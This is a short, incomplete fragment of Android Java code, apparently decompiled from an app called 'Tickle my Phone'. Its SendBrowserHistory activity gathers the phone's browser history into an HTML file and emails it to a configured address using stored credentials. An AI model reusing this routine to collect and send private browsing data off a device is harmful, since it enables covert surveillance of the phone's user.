...
public class SendBrowserHistory extends Activity {
    ...
    public void onResume() {
        ...
        String SMStextMessages = TML_Library.GetBrowserHistory(this);
        String FileName = TML_Library.getTMLPath() + "ticklemyphonebrwhist.html";
        TML_Library.CreateLogText(this, FileName, SMStextMessages);
        String SMSBody = getString(R.string.app_name) + " All Browser history  details attached here. ";
        if (TML_Library.GetInternetConnectionInfo(this).contains("no internet")) {
            ...
            TML_Library.SendEmail(this, TML_Library.GetU(this), TML_Library.GetP(this), this.LS_EmailAddress, "Tickle my Phone " + getString(R.string.oth62_RetrieveBrowser), SMSBody, FileName);
